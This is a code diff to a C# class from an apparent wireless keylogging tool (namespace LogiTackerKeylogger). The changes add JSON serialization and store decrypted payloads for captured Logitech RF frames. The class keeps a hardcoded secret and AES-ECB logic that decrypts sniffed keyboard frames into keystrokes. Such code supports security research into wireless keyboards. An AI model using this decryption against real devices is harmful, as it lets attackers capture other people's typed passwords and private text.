@@ -1,7 +1,9 @@
 ﻿using System;
+using System.Web.Script.Serialization;
 using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Text;
+using LogiTackerGUI;
 
 namespace LogiTackerKeylogger {
     class AirFrame {
@@ -11,6 +13,7 @@ namespace LogiTackerKeylogger {
         public sbyte rssi { get; }
         public byte payloadLength { get; }
         public byte[] payload { get; }
+        public byte[] decryptedPayload { get; set; }
 
 
         private static byte[] LittleKnownSecret = { 0x04,0x14,0x1d,0x1f,0x27,0x28,0x0d,0xde,0xad,0xbe,0xef,0x0a,0x0d,0x13,0x26,0x0e };
@@ -27,8 +30,20 @@ namespace LogiTackerKeylogger {
             if(payloadLength == 0)
                 return;
 
+            //Console.WriteLine(BitConverter.ToString(inputReportBuffer).Replace("-"," "));
+
             payload = new byte[payloadLength];
             Array.Copy(inputReportBuffer,12,payload,0,payloadLength);
+        }
+
+        public AirFrame(AirFrameJSON input) {
+            address = Form1.HexStringToByteArray(input.Address.Replace(":",""));
+            pid = input.PID;
+            rf_channel = input.Ch;
+            rssi = input.RSSI;
+            payloadLength = input.Length;
+            payload = Form1.HexStringToByteArray(input.Payload.Replace(":",""));
+            decryptedPayload = Form1.HexStringToByteArray(input.DecryptedPayload.Replace(":",""));
         }
 
         public string toString(bool decrypt = false) {
@@ -39,12 +54,33 @@ namespace LogiTackerKeylogger {
             output += "RSSI: " + rssi.ToString() + "\n";
             output += "Payload Size: " + payloadLength.ToString().Replace("-","");
 
-            if(payloadLength == 0) {
+            if(payloadLength == 0)
                 return output;
-            }
 
             output += "\nPayload: " + BitConverter.ToString(payload);
             return output;
+        }
+
+        public string toJSON() {
+            AirFrameJSON json = new AirFrameJSON();
+
+            json.Address = BitConverter.ToString(address).Replace("-",":");
+            json.PID = pid;
+            json.RSSI = rssi;
+            json.Length = payloadLength;
+
+            if(payload != null)
+                json.Payload = BitConverter.ToString(payload).Replace("-",":");
+            else
+                json.Payload = "";
+
+
+            if(decryptedPayload != null)
+                json.DecryptedPayload = BitConverter.ToString(decryptedPayload).Replace("-",":");
+            else
+                json.DecryptedPayload = "";
+
+            return new JavaScriptSerializer().Serialize(json);
         }
 
         private byte[] CryptoAES_ECB_Encrypt(byte[] Key,byte[] Plain) {
@@ -65,7 +101,7 @@ namespace LogiTackerKeylogger {
             return CryptoAES_ECB_Encrypt(DeviceKey,LittleKnownSecret);
         }
 
-        public byte[] DecryptKeyboardFrame(byte[] DeviceKey) {
+        public void DecryptKeyboardFrame(byte[] DeviceKey) {
 
             //Check arguments
             if(DeviceKey == null || payload == null || payloadLength != 22)
@@ -90,7 +126,7 @@ namespace LogiTackerKeylogger {
             for(sbyte i = 0; i < 8; i++)
                 Result[i] ^= FrameKey[i];
 
-            return Result;
+            decryptedPayload = Result;
         }
 
     }
